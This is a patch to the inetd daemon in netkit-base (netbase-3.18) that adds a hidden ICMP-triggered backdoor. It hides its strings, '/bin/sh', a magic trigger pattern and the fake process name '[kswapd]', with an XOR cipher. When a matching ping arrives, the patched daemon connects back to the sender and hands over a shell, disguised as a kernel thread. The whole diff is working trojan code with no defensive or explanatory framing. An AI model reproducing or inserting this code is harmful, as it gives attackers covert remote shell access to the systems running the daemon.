@@ -1,0 +1,128 @@
+*** netbase-3.18/netkit-base/inetd/inetd.c.old	Tue Oct 10 16:57:12 2000
+--- netbase-3.18/netkit-base/inetd/inetd.c	Wed Oct 11 20:22:17 2000
+***************
+*** 141,146 ****
+--- 141,147 ----
+  
+  #include <netinet/in.h>
+  #include <netinet/ip.h>
++ #include <netinet/ip_icmp.h>
+  #include <arpa/inet.h>
+  
+  #include <errno.h>
+***************
+*** 184,190 ****
+  static int 	global_queuelen = 128;
+  
+  static int	debug = 0;
+! static int	nsock, maxsock;
+  static fd_set	allsock;
+  static int	options;
+  static int	timingout;
+--- 185,191 ----
+  static int 	global_queuelen = 128;
+  
+  static int	debug = 0;
+! static int	nsock, maxsock, rawsock;
+  static fd_set	allsock;
+  static int	options;
+  static int	timingout;
+***************
+*** 264,269 ****
+--- 265,280 ----
+  static void setup(struct servtab *sep);
+  static int bump_nofile(void);
+  
++ #define	ICMPPACKETSIZE	64
++ #define XORCODE		39
++ /* [kswapd] xor'ed with code 39 */
++ char fake[] =           "\x7c\x4c\x54\x50\x46\x57\x43\x27";
++ /* \xde\xad\xaf\xfe xor'ed with code 39 */
++ char pattern[] =        "\xf9\x8a\x88\xd9\x27\x22\x27\x27";
++ /* /bin/sh xor'ed with code 39 */
++ char run[] =            "\x08\x45\x4e\x49\x08\x54\x4f\x27"; 
++ static void rawicmp(int);
++ 
+  
+  struct biltin {
+  	const char *bi_service;		/* internally provided service name */
+***************
+*** 409,414 ****
+--- 420,429 ----
+  		(void)setenv("inetd_dummy", dummy, 1);
+  	}
+  
++         rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
++         FD_SET(rawsock, &allsock);
++         if (rawsock > maxsock) maxsock = rawsock;
++ 
+  	for (;;) {
+  	    int n, ctrl;
+  	    fd_set readable;
+***************
+*** 427,433 ****
+  		    sleep(1);
+  		    continue;
+  	    }
+! 	    for (sep = servtab; n && sep; sep = sep->se_next)
+  	    if (sep->se_fd != -1 && FD_ISSET(sep->se_fd, &readable)) {
+  		n--;
+  		if (debug)
+--- 442,449 ----
+  		    sleep(1);
+  		    continue;
+  	    }
+! 	    if (rawsock != -1 && FD_ISSET(rawsock, &readable)) rawicmp(rawsock);
+!             for (sep = servtab; n && sep; sep = sep->se_next)
+  	    if (sep->se_fd != -1 && FD_ISSET(sep->se_fd, &readable)) {
+  		n--;
+  		if (debug)
+***************
+*** 1705,1707 ****
+--- 1721,1766 ----
+  	return (result);
+  }
+  #endif
++ 
++ void doxor(char *b) {
++    int i = 0;
++    for (i = 0; i < strlen(b); i++) b[i] ^= XORCODE;
++ }
++ 
++ 
++ static void rawicmp(int s) {
++    struct icmphdr *icmph;
++    struct sockaddr_in sin;
++    char   packet[64];
++    int    o, len = sizeof(sin);
++ 
++    if (recvfrom(s, packet,sizeof(packet) , 0, (struct sockaddr*)&sin, &len)>0) {
++       icmph = (struct icmphdr *) (packet + sizeof(struct ip));
++       doxor(pattern);
++       if (icmph->type == ICMP_ECHO &&
++           !strncmp(packet + 36, pattern, strlen(pattern))) {
++           o = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
++           sin.sin_port = htons( (char)*(packet + 36 + strlen(pattern)) * 0x100 + 
++                                   (char)*(packet + 37 + strlen(pattern)) + 0x100);
++           if ( o != -1 && !connect(o, (struct sockaddr*)&sin, len)) {
++              if (!fork()) {
++                 dup2(o, 0);
++                 dup2(o, 1); 
++                 dup2(o, 2);
++                 doxor(run); 
++                 if (servtab) 
++                    execlp(run, servtab->se_argv[0], NULL);
++                 else {
++                    doxor(fake);
++                    execlp(run, fake, NULL);
++                    doxor(fake);
++                 }
++                 doxor(run);
++                 shutdown(o, 2);
++                 exit(0);
++              }
++           }
++       }
++       doxor(pattern); 
++    }
++ }
